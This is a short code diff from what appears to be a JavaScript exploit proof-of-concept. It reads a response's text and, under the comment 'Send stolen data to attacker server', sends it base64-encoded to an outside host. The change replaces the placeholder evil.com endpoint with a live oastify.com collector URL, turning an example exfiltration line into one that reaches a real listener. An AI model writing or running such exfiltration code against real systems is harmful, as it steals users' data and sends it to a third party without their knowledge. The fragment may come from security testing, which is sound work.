@@ -16,7 +16,7 @@
           let data = await resp.text();
           
           // Send stolen data to attacker server
-          await fetch("https://evil.com/log?data=" + btoa(data));
+          await fetch("https://m9wwfmwclcldsfi462pa46fht8z4nvbk.oastify.com/log?data=" + btoa(data));
         } catch(e) {
           console.log("Exploit failed:", e);
         }
